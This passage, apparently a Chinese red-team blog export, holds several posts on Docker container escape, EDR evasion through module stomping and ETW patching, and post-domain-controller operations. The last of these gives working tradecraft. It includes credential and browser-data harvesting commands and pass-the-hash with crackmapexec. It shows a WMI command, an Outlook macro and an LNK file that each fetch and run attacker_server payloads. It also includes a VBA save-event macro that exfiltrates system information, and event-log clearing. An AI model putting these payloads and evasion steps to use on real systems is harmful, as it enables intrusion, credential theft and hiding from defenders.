无服务无服务（Serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，这并不是说没有服务器，而是说开发者不用去管服务器只负责开发就行。省去了运维的工作 通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS） 微服务微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信。 服务网格服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互。 Docker的攻击面容器镜像风险 开发者引入了存在漏洞版本的第三方依赖组件 攻击者在公共镜像仓库投毒的恶意镜像 开发者调试过程中遗留的数据库密码API密钥 活动中容器本身风险 容器在使用中映射出的敏感服务端口 可未授权访问 容器运行本质是基于宿主机操作系统内核，可导致CPU资源耗尽 不安全的配置与挂载 Docker 通过三种主要机制实现容器隔离： Linux 命名空间（Namespaces）： 作用：隔离容器的“视图”，让每个容器觉得自己拥有独立的文件系统、网络、进程列表、主机名等。 实现方式：Linux 内核功能，为每个容器创建独立的“命名空间”。例如，PID 命名空间让容器有自己的进程 ID 1，网络命名空间让容器有自己的 IP 地址和端口。 Linux 控制组（cgroups）： 作用：限制和管理容器可以使用的系统资源，如 CPU、内存、硬盘 IO。 实现方式：Linux 内核功能，为每个容器分配并限制其可以使用的资源配额，防止单个容器耗尽系统资源。 RootFS (根文件系统)： 作用：为每个容器提供一个独立的、隔离的文件系统。容器内的文件操作不会影响主机或其他容器。 实现方式：Docker 使用**联合文件系统（Union File System）**技术（如 OverlayFS）来构建容器镜像，它由多个只读层和一个可写层组成，高效且隔离。 简而言之，命名空间让容器“看不见”彼此和主机，cgroups限制它们能“用多少”资源，而RootFS则提供了独立的“存储空间”。 如果设定了以下配置就会导致相应的隔离机制失效： –privileged：特权运行使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 –nethost：通网挂载使容器与宿主机处于同一网络命名空间，网络隔离被打破 –pidhost：进程映射使容器与宿主机处于同一进程命令空间，进程隔离被打破 –volume :host：文件映射使宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口的风险Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket UNIX socketUNIX socket 的风险主要在于 Docker 守护进程默认以宿主机的 root 权限运行，因此就可以借助这点进行提权或者容器逃逸。 这类风险主要有两个利用场景： 普通用户被加到 Docker 用户组内提权 如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限。 具体的做法可以简单描述为：使用普通用户创建一个 privileged 为 true 的容器，在该容器内挂载宿主机硬盘并**写入定时任务，然后将宿主机的 root 权限反弹回来，**后期将详细介绍这种方法的使用。 UNIX socket 挂载到容器内部 用于逃逸 有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，RT 就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限。 TCP socket现在 Docker 守护进程默认不会监听 TCP socket，不过有时可能用户会因为方便开启 TCP socket 的监听，一般默认监听端口是 2375 默认情况下，Docker 守护进程 TCP socket 是无加密无认证的，因此如果发现宿主机 Docker 开放了 TCP socket，就可以直接使用 docker -H 接管目标的容器 其他风险容器网络风险虽然默认情况下，容器内部的网络与宿主机是隔离的，但是每个容器之间是彼此互相连通的，理论上在容器之间是存在内网横向的风险的。 宿主机操作系统风险宿主机操作系统风险容器通常与宿主机共享内核，也就是说如果宿主机内核存在漏洞，意味着容器可能也会存在相同的漏洞。 例如如果宿主机存在脏牛漏洞，那么拿到容器权限后，使用脏牛漏洞就可以获得宿主机权限，实现容器逃逸。 软件自身的漏洞Docker 自身存在的一些漏洞，比如 CVE-2019-14271、CVE-2019-5736 等都可以导致容器逃逸，这些也都是风险点，后面会对这些漏洞进行尝试复现。","tags":["Cloud"],"categories":["penetration"]},{"title":"AV_EDR对抗痛点","path":"/posts/2580e02a/","content":"AV_EDR对抗痛点参考链接：https://www.bilibili.com/video/BV1dH8GzDErF/ 思路来源： @RedCore_Moriaty 前言EDR的主要闪光点并非在拦截，而是它的行为分析和语言模型。面对EDR的围追堵截，维持权限已经越做越难。对应C2 开发-二线红队与EDR的对抗强度决定一线红队的驻扎与打点 在现在这种对抗强度巨大的情景下，一线红队的目标应该专注于既定目标的完成，而不是权限的长期维持。 可以类比你上去给特朗普一巴掌，就要做好被安保摁住的准备，但其实在这样的防护下，能够完成这个艰巨的任务就已经很不容易了 因此二线红队，也就是C2开发，本身要做的核心任务就是给一线创造空间，破开最大的时间窗口。 也就是将精力投入到对抗的环节上 详叙核心概念：进程注入链_延迟对抗这里其实本质上就是在讲一件事情:如何用”奇技淫巧”(误)拖缓EDR的分析时间并达成为一线拉开达成既定目标的时间窗口 手法概览传统思路1：内存加载C2通过远程控制下发 Beacon Payload，利用内存函数申请内存，将加密的 Payload 解密后直接放进内存，并执行，实现 无落地、隐蔽执行。 1. 利用内存分配函数 API常见的 Windows API 有： VirtualAlloc VirtualAllocEx NtAllocateVirtualMemory HeapAlloc 它们的目的是：在当前或远程进程的内存空间中申请一块内存区域，并指定权限（如 PAGE_EXECUTE_READWRITE）以支持后续执行。 2. 为 Beacon 分配内存并加载解密一般 Beacon 是一个加密后的 Payload（二进制 blob），有如下特征： 已加密（避免特征被查杀） 存在于内存中，未写入磁盘（避免落地） 加载时需要解密（如 XORAESRC4） 过程是： 用 VirtualAlloc 申请内存 将加密的 Beacon（Shellcode）解密成明文 把解密后的内容写入申请的内存地址 3. 修改执行（跳转）内存中的 Payload 并不会自动执行，需要控制程序流跳转到它那执行： 常见方式： CreateThread NtCreateThreadEx QueueUserAPC + Sleep SetTimer Callback 栈迁移 + jmp 指令跳转（Reflective DLL 中常见） 目标：让程序跳到你申请的内存执行 Beacon 逻辑。 这个现在根本行不通，不用说后期日志取证，在执行阶段就已经被拦截。 为何行不通，阐述防御机制这和windows内存页自身的属性有关 正常进程加载的模块是 MEM_IMAGE 类型内存页，自己手动申请的内存则是 MEM_PRIVATE。这个差异是蓝队检测内存注入、反射加载的基础指标之一。 只需要能监控到你执行的代码区域，只需要你落到MEM_PRIVATE，因此软件基于非MEM_IMAGE 类型内存页执行代码的判断就非常迅速且简单 这也叫做代码执行区审查 传统思路2：Module Stomping对抗代码合法审查检测将合法模块加载到内存中后，覆盖其 .text 段或入口函数处的代码，用作恶意代码的跳板执行，借助其 MEM_IMAGE 属性掩盖真正 Payload 的行为 1. 调用 LoadLibraryA(合法模块.dll) 加载合法 DLL（比如 mshtml.dll、duser.dll 等） 一般我们会使用**LoadLibrary函数去动态加载DLL，但是这会出现一个问题，通过LoadLibrary函数去动态加载DLL会受到控制流(CFG)的限制。**CFG会组织执行未经过签名的和验证的代码。 这里可以使用NtCreateSection函数以及NtMapViewOfSection函数来手动映射DLL文件，这可以确保映射的内存区域为SEC_IMAGE权限。 2. 用 VirtualProtect 修改其 .text 段权限为 PAGE_EXECUTE_READWRITE 或者直接操作 PEB 中的模块入口点（更隐蔽） 3. 将你的 Beacon Shellcode 写入 .text 区段 或 DllMain 典型鸠占鹊巢，把合法模块原始逻辑覆盖掉 .text部分是通常包含了可执行的代码，那么攻击者就可以覆盖其这部分代码，将合法的代码替换为shellcode。 4. 调用模块导出函数 或 创建线程执行入口点 实际执行的就是你写入的 Beacon，而看上去是合法模块的行为 对应传统思路1的进阶反制之前我们是通过VirtualAlloc申请私有内存，将shellcode写入到其中。而MoudleStumping是通过劫持合法dll， 篡改合法内存执行代码。.text 区域是 MEM_IMAGE 类型 → 不在 EDR 的 MEM_PRIVATE+EXECUTE 监控范围内 没有新模块注入 → dlllist, pe-sieve, memory scanner 等不会报告新增模块 所在模块路径存在于磁盘 → 无法一眼看出是注入模块 EDR防御机制（基于业务与排查方法阐述通过EDR的角度来看，从日志而言是肯定能观测到鸠占鹊巢的行为，但正常系统的dll也存在这种覆写行为，因此EDR需要结合其他维度进行排查 因此免杀的目的，其实就是拉高EDR的阈值，为一线人员争取更多完成既定任务的时间。 这里拿出一个情境来说：作为EDR而言，在一个生产环境中，用户每日都在进行打开WPS,Outlook,打印等流程。基于这个行为制作出了对应的行为模型和标杆，那么你作为外部测试人员，哪怕是通过Moudle Stumping鸠占鹊巢的手段达成了驻留的目的，但你在里面执行命令的操作势必就犹如在地铁上刷登机牌一样，对于EDR日常模拟出的用户行为模型是明显的不正常行为 EDR with VBS防御机制在 Win10 之后（特别是 Win11 默认开启），VBS 指的是： 通过 Hyper-V 虚拟化技术实现的内核隔离机制，用来强化 Credential Guard、HVCI、Kernel Code Integrity 等功能。 VBS 与 EDR 的整合：做了哪些事？ 功能 作用 对红队影响 HVCI（Hypervisor-protected Code Integrity） 强制所有内核代码都要经过签名校验 拒绝加载未签名或伪造签名的驱动 Credential Guard 将LSASS运行在 VSM（隔离容器）中 传统 mimikatz 无法直接读内存 Kernel-mode Code Integrity（KMCI） 加强驱动签名验证与运行时保护 加载 BYOVD 驱动时易被拦截拒绝 KDP（Kernel Data Protection） 保护某些内核对象和结构不可修改 Patch SSDTEDR回调 失败率提高 EDR Sensor Isolation 将 EDR 驱动模块运行在 VTL1（虚拟化信任层） 红队无法在 VTL0（正常内核）中卸载patch 探针 简言之：你即使能提权拿到 SYSTEM，甚至能注入内核，也无法“真正”对抗驻留在 VBS 支持下的 EDR 内核组件。 在 Windows 11 中，EDR 利用 VBS 做的最关键事情是**：加强对内核代码完整性、驱动签名验证、EDR 模块隔离的控制**，导致红队几乎无法使用传统 BYOVD 手法加载未签名或漏洞驱动来做内核 Patch 或卸载。 注解：BYOVD手法 也就是利用内核驱动关闭杀软进程 参考：奇安信攻防社区-BYOVD技术实战：利用内核驱动关闭杀软进程 因此在VBS机制的保护下，硬刚EDR其实是损耗比很大的工作，与其追求卸载杀软进程，不如从绕和驻留的角度进一步入手这个思路。 EDR_ETW订阅机制引申：为什么我们在当前用户权限下，无法影响patch EDR 内部的 ETW 订阅机制？ ETW是**一种Windows内核和应用程序级的事件跟踪机制，允许捕获系统运行时的事件，**EtwEventWrite函数是用于生成这些事件的函数。当恶意软件或攻击者希望隐藏进程的活动或避免监控时，他们可能会使用ETW补丁技术来拦截或修改EtwEventWrite函数，从而阻止进程生成ETW事件。 相对的 阐述一下BypassETW手法（如图） 但在当前情境下，我们通过BypassETW实现规避监控是很困难的，可以通过logman query providers观察到微软内置的一些监控进程。 可以看到哪怕没有EDR，微软自带的威胁情报也能监控的死死的。","tags":["Bypass","二线","C2"],"categories":["research"]},{"title":"仅仅拿下了域控？","path":"/posts/c6650469/","content":"仅仅拿下了域控？前言接管全域过后，拔剑四顾心茫然。仅仅拿下了域控？ 域控究竟代表了什么？哪怕你dump下了所有用户的密码hash等数据，面对画不完的拓扑，被拦截的流量，下一秒运维就会发现的危机，哪怕手握重器都有心无力。那么怎么在尽可能短的时间内扩大化战果？怎么找到真正有价值的东西？这是中文语境中大多数渗透文章缺失的部分 众所周知，拿下域控只是渗透中的一环。如何定位重要资产并拿下重要的内容，以及立足于内网和实战中规避明显流量特征信息收集，而不是傻瓜式的自动化用fscan、Nmap简单套一些线程做完整的信息收集。 这是渗透核心问题：如何绕过”脚本小子阶段”的暴力面扫与信息堆叠，转而基于目标导向的资产定位、隐蔽行动、实战级信息收集与行动策略调整。 核心理念：不是收集越多信息越强，而是定位越准、干扰越少才有生存空间。 从”网段-主机-服务”的流量逻辑转变为”组织-业务-人员-资产-薄弱点”的思维逻辑。 关键点：目标导向资产链 组织结构分析 → 关键人员识别 → 业务系统映射 → 数据流向分析 → 安全策略评估 → 攻击路径规划 一、组织结构分析：绕开FScan逻辑的隐蔽信息收集fscan + rdpscan + MS17xxx一把梭，最多会吃EDR拉黑运维踢出。因此我们要的是非特征性信息收集链： 基于组织架构的轻量枚举 - 一条命令一批信息 操作 工具命令 作用 获取当前主机与邻接主机信息 net view, arp -a, WMI查询 无需任何扫描 AD结构探测（无密码） ldapsearch, bloodhound-python，PowerView 可选用Kerberoasting收集用户信息 DNS递归探测 nslookup -typeany domain.local + zone walking 无需大范围端口扫描 SMB管道探测邻域 net group domain、net session等 获取连接路径和关系图谱 缓存凭据探测 vaultcmd, mimikatz, WMI事件探测 指向高权限账户位置 进程与服务观察 tasklist, Get-WmiObject Win32_Service 辅助定位关键业务主机 利用现有”可见面”搜集内部信息作为域控，有权限访问这个业务的势必是技术人员企业高管，那么从域控入手，思考技术人员的配置习惯，以及到底都是谁登录访问了这台机器，都很有必要作为我们收集的方向。 GPO配置导出：大量安全策略信息，包括认证策略、共享策略等 注册表横向情报：如自动登录、共享缓存、历史连接信息 登录日志本地关联：可通过”谁登录过这台机器”反推出”谁可能是管理员” 域控机上的实战信息收集清单： 域结构情报（组织、人、权限三位一体）# OU列表（组织结构）Get-ADOrganizationalUnit -Filter * | select Name, DistinguishedName# 域用户列表（含描述字段很重要）Get-ADUser -Filter * -Properties DisplayName, Description, EmailAddress | Format-List# 域安全组Get-ADGroup -Filter * | select Name, GroupScope, Description 看”描述””Email地址””DisplayName”可以挖人找业务、识别高价值目标。 权限链分析（导出关系 本地分析）BloodHound 导出数据： 如果你不想跑 full ingestor，可以用轻量化方式导出： # 用户-组关系、主机信息、ACL 权限等SharpHound.exe -c All -domain YOURDOMAIN.local -zipfilename data.zip 导出的 data.zip 本地分析即可，不需要网络回传。 二、关键人员识别：以人为核心建立信息收集视角大多数实战目标都不是机器，而是人。围绕”人”来做信息收集，比堆资产更有效。 也就是我一直强调的内容：内网中一切流量都变得明显，既然拿下了域控那么将由常规的网络空间转为管理视角的业务空间 典型策略 信息源 目的 AD中的description字段 找到业务、工号、邮箱、VIP标识 邮箱地址中的”别名” 分辨职务和层级（如 zhangy-vp@corp.local） 共享文档中检索”密码”、”外包”、”RDP”等关键词 获取敏感操作线索 持续登录机器中识别多账户环境 哪些人”常驻”在哪些资产 SMTP邮件服务器日志 发现与外部联系的关键资产 凭据相关（不是mimikatz，而是静态行为推演）看谁来过域控： # 安全日志：查看 Event ID 4624（登录）Get-WinEvent -LogName Security | ? $_.Id -eq 4624 | select -First 100 | Format-List 查询本机是否保存了密码RDP历史： # Vault 凭据vaultcmd /listcreds:Windows Credentials# RDP历史（注册表）reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers 三、业务系统映射：从资产定位到业务理解组策略情报（看策略，看谁被管）# 本地有效策略gpresult /R# 全局策略列表Get-GPO -All | select DisplayName, GpoStatus, CreationTime# GPO中脚本、映射、计划任务（爆破定制逻辑）Get-GPOReport -Name XXX策略 -ReportType HTML -Path C:\\GPO-XXX.html 注意 GPO 中常嵌脚本、计划任务映射、共享驱动器等”业务手脚”。 关键资产与服务定位（不是扫，是读）查询域中计算机对象： Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate | Format-Table Name, OS, LastLogonDate 重点看命名规律，如 sql-prod-01、sap-fin-02、jump-vpn-01 、DB39、storage-88等业务侧命名。 重要资产定位方法论（不靠扫描靠推演）基于组织结构做推演一般也可以通过主机名做对应的推演 关键问题： 谁是业务管理？ 谁负责敏感数据（如财务、人事、RD）？ 谁有更高权限或接口权限？ 结合线索构建目标资产优先级 线索类型 实例 登录频率高 某主机被多人登录、夜间活跃 数据量大 文件夹共享目录大，含数据库连接符 被访问最多 日志中频繁出现RDPSMB访问 服务关联性强 DNS服务器、域控、堡垒机、工控主机 四、数据流向分析：主动”听人说话”事件日志 + 文件痕迹看用户或系统留下的痕迹： # 最近被访问文件Get-ChildItem -Path C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent# Office中最近打开的文件dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Office\\Recent → 能看到谁在操作什么搜索含”密码”、”账号”、”VPN”的文件内容： Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.docx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password|vpn|账号|密码 -Encoding UTF8 深入用户本身：浏览器数据与用户行为分析当你拿到了域控，接下来的目标应该是深入到具体的办公机，挖掘用户的真实行为数据。这里不再是传统的”拿Shell-提权-横向”的机械流程，而是要像一个真正的企业用户一样，通过看似正常的数字足迹来构建完整的攻击路径。 HackBrowserData浏览器是现代用户最重要的数字入口，也是信息泄露的重灾区。相比传统的内存dump或注册表挖掘，浏览器数据挖掘更加精准、高效。 浏览器数据收集策略： # 基础收集（适用于Chrome、Firefox、Edge等主流浏览器）./HackBrowserData -b chrome -f json -dir ./output./HackBrowserData -b firefox -f json -dir ./output./HackBrowserData -b edge -f json -dir ./output# 批量收集所有浏览器数据./HackBrowserData -b all -f json -dir ./browser_data 但这里有个坑点：你立足于域控 作为ntsystem权限的同时无法直接接触到目标用户上下文，就会由于无法获取用户DPAPI Key导致无法解密用户Chrome浏览器的Cookie以及loginData表， 因此 获取域控并不代表获取一切 下面也简单介绍几个方法 方法1：迁移到用户 Session 再解密 查用户在哪个 Session： query user 用 tscon 切换： tscon session_id /dest:console 再执行解密工具（如 HackBrowserData），这时你就在用户的上下文中，也就拥有了解密权限。 方法2：等用户登录，自动抓数据 放个计划任务、WMI事件、LNK、宏脚本等 等用户登录后，在他会话里触发你的 payload这种方法就比较需要用户本身的交互，隐蔽性的保证我会在后续的方案中提到 从浏览器数据中提取情报： 密码管理分析： 保存的登录凭据（内网系统、云服务、VPN等） 自动填充的表单数据（可能包含敏感信息） 支付信息和个人资料 业务系统映射： 访问历史中的内网域名和IP 书签中的业务系统分类 下载记录中的敏感文件 社交工程素材： 搜索历史揭示的兴趣爱好 社交媒体账号和活动轨迹 个人习惯和行为模式 用户行为分析 文件系统考古： 不同于暴力搜索，这里要做的是”考古式”的挖掘： # 用户最近活动的文件Get-ChildItem -Path C:\\Users\\*\\Desktop -Recurse -Include *.lnk | ForEach-Object $shell = New-Object -ComObject WScript.Shell $shortcut = $shell.CreateShortcut($_.FullName) [PSCustomObject]@ Name = $_.Name TargetPath = $shortcut.TargetPath WorkingDirectory = $shortcut.WorkingDirectory LastWriteTime = $_.LastWriteTime # Office文档的元数据分析Get-ChildItem -Path C:\\Users\\*\\Documents -Include *.docx,*.xlsx,*.pptx -Recurse |ForEach-Object $doc = New-Object -ComObject Word.Application $document = $doc.Documents.Open($_.FullName, $false, $true) [PSCustomObject]@ FileName = $_.Name Author = $document.BuiltInDocumentProperties.Item(Author).Value Company = $document.BuiltInDocumentProperties.Item(Company).Value LastModifiedBy = $document.BuiltInDocumentProperties.Item(Last Author).Value CreationDate = $document.BuiltInDocumentProperties.Item(Creation Date).Value $document.Close() $doc.Quit() 网络连接历史分析： # DNS缓存分析ipconfig /displaydns | Select-String Record Name | ForEach-Object $_.ToString().Split(:)[1].Trim() |Sort-Object | Get-Unique# 持久化连接分析netstat -an | Select-String ESTABLISHED# WiFi连接历史netsh wlan show profiles | Select-String All User Profile 应用程序使用模式： # 最近运行的程序Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU |Select-Object -Property * -ExcludeProperty PS*# 跳转列表分析（显示用户最常用的文件和应用）Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations -Filter *.automaticDestinations-ms 五、隐蔽持久化持久化与横向移动也应贴近业务流，不制造异常流量要避免”显眼”特征，就不能搞那些显式的smbbrute全流量扫描。 常规思路文件不落地的简单隐蔽打法1. 利用AD中继 PTH全域 NTLM中继攻击捕获目标的Net-NTLM Hash，并使用Hash传递（Pass-the-Hash, PtH）技术直接认证到其他主机，无需在目标主机上写入文件，实现横向移动。 # 直接上cme，这个比较常规，就是cme组合拳上线crackmapexec smb Target_IP -u Username -H NTLM_Hash -x command# 不过就目前而言 nxc的效果会比cme好些 2. 利用WMI执行远程命令（无二进制落地） Windows Management Instrumentation (WMI) 是Windows系统管理接口，可通过DCOM或WinRM协议远程执行命令，无需在目标主机上写入二进制文件，避免触发传统防病毒检测。 内存执行： Invoke-WmiMethod -ComputerName -Class Win32_Process -Name Create -ArgumentList powershell.exe -ep bypass -c Invoke-RestMethod -Uri http:///malicious.ps1 | Invoke-Expression 规避检测可以使用加密通道（如WinRM over HTTPS）或混淆脚本以降低被检测概率。 3. 利用RDP共享剪贴板进行数据搬运（非网络传输） 流程： 建立RDP会话：攻击者需具备目标主机的RDP访问权限（通过凭据或漏洞利用） 启用剪贴板共享：确保RDP客户端（如mstsc.exe）配置允许剪贴板共享（默认启用） 数据提取： 在目标主机上，运行命令收集敏感数据，将结果复制到剪贴板 Get-Content C:\\sensitive.txt | Set-Clipboard 数据回传： 反向操作，将恶意脚本或命令通过剪贴板复制到目标主机，执行： Get-Clipboard | Invoke-Expression 4. 借助Outlook宏或LNK文件实现”无感知”植入 Outlook宏： Sub AutoOpen() Shell powershell.exe -ep bypass -c Invoke-RestMethod -Uri http://attacker_server/shell.ps1 | Invoke-Expression, vbHideEnd Sub LNK文件： $Shell = New-Object -ComObject WScript.Shell$Shortcut = $Shell.CreateShortcut(office365.lnk)$Shortcut.TargetPath = powershell.exe$Shortcut.Arguments = -ep bypass -c Invoke-RestMethod -Uri http://attacker_server/office365.ps1 | Invoke-Expression$Shortcut.Save() 在 Outlook 中创建宏 - Microsoft 支持 常见钓鱼招式-先知社区 但本质还是需要交互，这是很不稳定的做法，更适合作为前期打点的入口。 真正的隐蔽方案综上四种方法，都是比较常规的。我认为这种隐蔽不叫隐蔽，只是不上线C2罢了，这和反弹一个非交互式shell有什么区别呢？它只是更慢热而已，而非所谓的贴近业务做隐蔽。它们根本没有脱离入侵者行为模型，只是少了一些被查杀的风险而已，本质还是可预测的攻击行为。 方案一：借用”内部运维平台”的业务流程做跳板 示例流程： 发现某内部自动化平台（如Ansible、Jumpserver、SaltStack、K8S API 在运维系统的配置中植入小段命令（或回调URL） 可用于横向部署或信息收集，且路径可继承现有的执行上下文 优势： 既没有新的连接，同时这个命令的签名也是合法应用提供的，会被自动归因为系统用户行为。 方案二：构造”数据流伪装”的隐蔽横向通信 示例机制： 在企业内工作人员的日常业务文档（如Excel报价单）中嵌入VBA宏，触发”保存时”事件，收集目标系统信息并通过伪装的常规流量回传，规避网络监控。用户保存文档时自动触发，无需额外交互。 Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean) Dim cmd As String Dim result As String 收集系统信息 cmd = cmd.exe /c whoami ipconfig tasklist result = CreateObject(WScript.Shell).Exec(cmd).StdOut.ReadAll 方法1：通过msxml2.xmlhttp发送HTTP Dim http As Object Set http = CreateObject(MSXML2.XMLHTTP) http.Open POST, http://attacker_server/upload, False http.setRequestHeader Content-Type, application/x-www-form-urlencoded http.Send data= EncodeBase64(result) Base64编码数据 方法2：通过WebDAV或SMB保存到共享 Dim fs As Object Set fs = CreateObject(Scripting.FileSystemObject) fs.CreateTextFile \\\\SMB_Server\\share\\env.txt, True fs.Write resultEnd Sub Base64编码函数Private Function EncodeBase64(text As String) As String Dim xml As Object Set xml = CreateObject(MSXML2.DOMDocument) Dim node As Object Set node = xml.createElement(base64) node.dataType = bin.base64 node.Text = text EncodeBase64 = node.nodeTypedValueEnd Function 不过如果只是想拿来钓鱼放到用户的桌面，就太粗暴了，这种情况下一般需要在组织内部OA系统进行投毒，修改某些工单的附件以此污染内部的主机 方案三：利用打印服务扫描仪ERP插件做隐蔽数据收集与横向 **打印扫描服务（如Spooler服务）**通常以SYSTEM权限运行，网络连接广泛（如共享打印机）。ERP插件（如SAP、Oracle E-Business Suite插件）常集成于业务流程，可访问敏感数据。 一般情况下，可以通过探活内网snmp协议展开对打印设备的入侵，很多打印机 SNMP 社区口令默认为 private 可写，你可以做这些事： 利用打印日志推用户名 snmpwalk -v2c -c public IP .1.3.6.1.2.1.43.18.1.1.8→ 打印任务发起人：zhanglin.hr, lixiang.fin, huangwei.ceo 反向推测业务分布 PRT-FIN-02, PRT-HR-03, PRINT-F3-CEO 你可以据此判断： 哪些业务线在哪些楼层 哪些区域有高权限使用者（CEO打印机） 某些高端设备会维护内建DNS缓存（HP、Ricoh设备），可以通过厂商MIB拉取缓存记录，从而就可以辅助识别网段边界、跳板位置、内部DNS信息 （由于在这方面研究比较少，所以就不展开叙述了） 打印服务渗透wiki 方案四：利用网络设备（路由器无线AP）构建隐蔽持久化跳板 内网中除了传统主机和服务器，企业路由器、三层交换机、无线AP等网络设备往往被安全防护系统“放过”。 类比解释 你是攻击者，主机是保安天天查身份证，EDR 就是摄像头在识别谁在动手。你现在如果： 拿了个锁匠工具（Fscan、Powershell、Mimikatz）上来开门，系统会报警 用个奇怪的指令连接别人机器（WinRMWMISMB），EDR 马上拉红 一上线 Beacon，立马就触发主机行为分析 这时候你再看路由器： 它每天都在发包、收包、转发、NAT，这是它的“本职工作” 它经常和上百个终端建立连接，不是异常，而是常态 它本来就开放了 SSH、Telnet、Web 管理后台，没有人会觉得“一个路由器在监听端口很奇怪” 具体攻击手段也和前面的打印设备类似，区别的是它的终端远比打印设备的要完整，打印设备的PTCshell等协议在市面上已经很少有开源工具作为支持，而只要你进了路由器的后台，无论是tcpdump用户流量的trick，还是构造 NAT 映射：让它转发端口给你主控机都是隐蔽 安全的操作 你不在线，你的跳板在线；你不扫网，你的跳板在旁路做转发——这才叫真正的隐身操控。 隐蔽性提升策略流量打散：避免使用固定C2通道、使用多协议（HTTP、DNS、SMB over namedpipe） 存储隐匿：恶意DLL注入到合法服务进程中，如svchost、spoolsv 行为嵌套：伪装成定时任务或用户操作逻辑（如Outlook加载项） 数据 exfil：打印队列、计划任务、截图偷发到内网SMTP或文件服务器 六、攻击路径规划：情报融合与攻击路径规划用户价值评估矩阵 维度 评估标准 组织地位 AD中的组织层级、管理关系 系统权限 对关键系统的访问权限 业务接触面 接触敏感业务的程度 技术敏感度 对安全工具的熟悉程度 社交价值 在组织中的影响力 基于情报的精准投递不再是广撒网式的横向移动，而是基于用户画像的精准投递： # 示例：针对财务部门的定向攻击# 1. 识别财务相关用户$FinanceUsers = Get-ADUser -Filter * -Properties Department | Where-Object $_.Department -like *财务* -or $_.Department -like *Finance* # 2. 分析其常用系统和工作模式# 3. 设计贴合其工作流程的载荷投递方式 持久化策略的业务化伪装基于收集到的用户行为数据，设计更加隐蔽的持久化方案： 场景一：利用用户的Office使用习惯：也就是前面提到的OA投毒 场景二：利用用户的软件使用模式 如果发现用户经常使用某个特定软件，可以通过DLL劫持或插件机制实现持久化，这样的行为更难被察觉。 这里推荐Loki C2的思路 Loki的攻击向量完全绕过了针对渲染器进程的全部安全加固措施。它通过劫持应用的启动脚本，直接在主进程的上下文中执行代码。由于主进程拥有与生俱来的、不受限制的Node.js权限，渲染器进程的沙盒化对此攻击毫无意义。 它通过修改应用启动脚本来完成攻击。其最精妙的设计在于init.js后门启动器，这是一个精心设计的状态机，用于管理寄生虫与宿主的生命周期。 反溯源与痕迹清理在深度信息收集的同时，也要考虑反溯源 行为模式伪装： # 模拟正常用户的文件访问模式# 在收集信息的同时，也要访问一些正常的业务文件Get-ChildItem C:\\Users\\$env:USERNAME\\Documents -Recurse |Get-Random -Count 5 | ForEach-Object Get-Content $_.FullName -Head 1 # 模拟正常的网络访问Invoke-WebRequest -Uri https://company-portal.com -UseBasicParsing 日志污染与清理： # 选择性清理相关日志wevtutil cl Windows PowerShellwevtutil cl Microsoft-Windows-PowerShell/Operational# 或者注入正常的日志条目来掩盖异常行为 总结可以从上面的三个方案看出来，真正隐蔽的横向和持久化不应建立在”技术规避”上，而应建立在”业务拟态”与”角色继承”上。都是把自己当成业务中的一环，思考他们平时接触的服务以及工作的逻辑，做成类似水坑攻击的打法。 整体策略小结 优先级 收集目标 目的 高 用户、组、描述字段 识别高价值目标 高 组策略 + 共享配置 查找潜在控制路径 中 凭据路径、RDP记录 判断行为 + 凭据可用性 中 主机命名规律 + 访问痕迹 判断资产属性 低 SMB共享文档、日志内容 侧写业务内容 结语高阶红队渗透的核心在于**从技术导向转向业务导向，从工具依赖转向思维推演，从暴力扫描转向精准定位。真正的隐蔽不是技术层面的规避，**而是业务层面的拟态。 拿到域控之后，我们要做的不是继续”攻击”，而是要成为这个网络环境中的”业务大水坑”。通过深度的用户行为分析和情报融合，我们可以构建出比任何自动化工具都要精准的攻击路径。 记住：在高阶渗透中，信息比权限更重要，理解比占领更有价值。","tags":["Pentest","后渗透"],"categories":["penetration"]},{"title":"身份隐藏_无痕系列(1)","path":"/posts/877fc705/","content":"前期隐蔽基建前期身份隐蔽（Pre-Engagement OPSEC）是红队行动成败的分水岭。无论你的目标是模拟 APT 还是做攻防演练，如果在前期就暴露了身份或被溯源到了真实资产，你后续的免杀、横向、ICS 渗透都可能前功尽弃。我们可以从APT案例研究+红队基建实践两个维度系统性切入，构建一个实用专题。 维度 目标 战术目标 学会如何在网络空间构建无法溯源、可更换的前期基础设施（域名、服务器、邮箱、CDN等 技术目标 理解和复现 APT 行动中的前期伪装手法（域名注册、TLS证书、WHOIS欺骗、CDN混淆、C2隧道） 工程目标 自建复用可控的匿名跳板资产体系：如 VPS 链、隐匿注册的云服务、分布式域名CDN中转 从APT研究案例为出发点-_-作为我们的参考材料与学习路线APT29 火眼报告 GET –https://services.google.com/fh/files/misc/rpt-apt29-hammertoss-stealthy-tactics-define-en.pdf?utm_source=chatgpt.com HAMMERTOSS_ 掷锤者行动 利用公共平台实现的C2美学0x01 APT29 HAMMERTOSS案例分析 1.1 案例背景威胁组织：APT29（俄罗斯政府背景）发现时间：2015年主要特征：极高的OPSEC纪律性和适应性活动时区：UTC+3（莫斯科时间）工作模式：俄罗斯假期停止活动，工作日活跃 1.2 HAMMERTOSS五阶段通信模型概要C2运行完全通过合法网络服务 利用Twitter Github 